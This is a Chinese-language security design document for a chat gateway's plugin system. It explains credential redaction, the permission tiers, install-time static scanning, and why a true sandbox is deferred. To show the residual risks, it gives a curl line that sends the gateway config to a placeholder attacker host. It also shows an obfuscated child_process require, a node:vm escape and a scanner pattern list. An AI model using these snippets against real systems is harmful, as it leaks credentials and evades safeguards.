# 插件安全模型

> **一句话**：本网关实现的是**能力收窄**，不是安全沙箱。它消除了"装个插件就等于
> 交出所有平台凭据"这个确定性损失，但**无法防御刻意为恶的插件**。
> 请只安装你信任其作者的插件。

---

## 一、当前保护了什么

### ✅ 凭据不再暴露（已彻底修复）

**修复前**：任何插件一行代码就能拿走全部凭据——

```js
// 旧版：插件可以这样做
this._services.configManager.get('adapters.telegram.botToken')  // → 真实 token
ctx.getConfig('server.authToken')                               // → 网关鉴权 token
```

**修复后**：原始 `configManager` 不再传给插件。取而代之的是受控视图：

- 未声明 `gateway.config` 权限 → 读任何网关配置都返回 `undefined`
- 即使声明了该权限 → **凭据字段仍被脱敏**（`***1234`），明文永不流入插件

> 插件若需要自己的 API key，请存放在**插件自身配置**里（`getConfig()` / `setConfig()`），
> 而不是去读网关配置。

### ✅ 危险能力需显式声明

| 权限 | 风险 | 说明 | 默认 |
|------|------|------|------|
| `config` | 低 | 读写插件自身配置 | ✅ 授予 |
| `gateway.filter` | 低 | 注册出站过滤器（可修改/拦截发出的消息） | ✅ 授予 |
| `gateway.send` | 中 | 主动向任意平台/会话发消息 | ✅ 授予 |
| `sessions` | 中 | 读写会话历史（**能看到用户聊天内容**） | ❌ 需声明 |
| `gateway.config` | 高 | 读取网关全局配置（凭据仍脱敏） | ❌ 需声明 |
| `gateway.admin` | 高 | 管理适配器与其它插件 | ❌ 需声明 |

在 `plugin.json` 中声明：

```json
{
  "name": "my-plugin",
  "permissions": ["sessions"]
}
```

未声明就调用 → 抛出清晰错误，而不是静默成功或静默失败：

```
插件 my-plugin 调用 getHistory() 需要 "sessions" 权限，请在 plugin.json 的 permissions 中声明
```

### ✅ 安装前风险披露

从 GitHub 安装现在是**两阶段**的：

1. 第一次请求：下载 → 静态扫描 → 返回"将获得哪些能力 + 可疑代码位置"，**不执行任何插件代码**
2. 用户在面板上看到披露信息并确认后，带 `confirm: true` 再请求一次，才真正落地加载

扫描会标记这些模式（命中不等于恶意，很多正当插件也会用）：

| 模式 | 等级 |
|------|------|
| `child_process` / `exec` / `spawn` | critical |
| 疑似访问 `gateway.json` / `botToken` / `authToken` | critical |
| `eval()` / `new Function()` | high |
| 文件写入/删除 | high |
| 读文件系统 / `process.env` | medium |
| 网络请求 | low |

### ✅ 框架代管资源回收

插件注册的出站过滤器由框架记录归属，禁用/卸载时**强制回收**——
即便插件自己的 `onUnload` 有 bug 或根本没写，也不会泄漏。

---

## 二、没有保护什么（务必知悉）

插件与网关**同进程运行，拥有完整 Node 权限**。以下攻击**无法阻止**：

```js
// ❌ 这些依然做得到
import fs from 'fs';
fs.readFileSync('config/gateway.json');          // 直接读磁盘上的凭据

import { execSync } from 'child_process';
execSync('curl attacker.com -d @config/gateway.json');  // 外传

process.env.SOME_SECRET;                          // 读环境变量
```

静态扫描能**提示**这些模式，但：
- 可以被混淆绕过（`require(['ch','ild_pro','cess'].join(''))`）
- 命中也不代表恶意（正当插件也读写文件）

**所以扫描是"知情工具"，不是"防护机制"。**

---

## 三、为什么不做真正的沙箱

评估过的方案与结论：

| 方案 | 是否可行 | 原因 |
|------|---------|------|
| `node:vm` | ❌ | Node 官方明确声明**不是安全机制**，`this.constructor.constructor('return process')()` 即可逃逸 |
| `worker_threads` | ❌ | 独立线程但**同进程同权限**，仍可 `import('fs')` |
| 独立进程 + Node 权限模型 | ✅ **唯一真正可行** | `node --permission --allow-fs-read=<插件目录>` 是真实边界 |

**为什么还没做第三种**：它要求插件 API 全面改为**异步消息式（IPC）**，而现有插件
的核心接口 `filterOutbound(message)` 是**同步**的——出站过滤器必须同步返回修改后的
消息。改成异步会破坏全部现有插件（包括 5 个内置插件）。

这是一次**破坏性 API 变更**，需要：
1. 设计新的异步过滤器协议（含超时与失败降级）
2. 提供 v1 → v2 迁移路径
3. 决定不迁移的老插件如何处理（拒绝加载？降级到同进程 + 明确警告？）

这个决定应该由项目维护者做，而不是我单方面推进。

### 真做的话，路线大致是

```
主进程（网关）
   │  IPC (structured clone)
   ▼
插件宿主进程  node --permission
              --allow-fs-read=./plugins/<name>
              --allow-fs-write=./data/plugins/<name>
              (默认禁 child_process / worker)
   └─ 每插件一个 worker，崩溃/超时可单独重启
```

配套收益：插件崩溃不再拖垮网关、可施加 CPU/内存配额、超时可强杀。

---

## 四、给插件作者的建议

- **最小权限**：只声明真正需要的。声明 `sessions` 意味着用户要信任你能看到全部聊天内容。
- **自己的密钥放自己的配置里**，不要试图读网关配置。
- **在 `onUnload` 里清理自己的资源**（定时器、连接）。出站过滤器框架会代管回收，
  但你的 `setInterval` 不会。
- **避免 `eval` / `child_process`**，否则会在用户安装时被标为 critical，劝退用户。

## 五、给用户的建议

1. **只装信任的作者的插件**——这是唯一真正有效的防线。
2. 安装时**认真看披露信息**，尤其 critical 级别的扫描发现。
3. 装完后在面板「插件管理」里能看到每个插件被授予的能力。
4. 不用的插件**卸载**而不只是禁用（禁用后代码仍在磁盘上，下次可能被误启用）。
5. 网关的 `config/gateway.json` 权限设为 `600`，减少同机其它程序读取的机会。
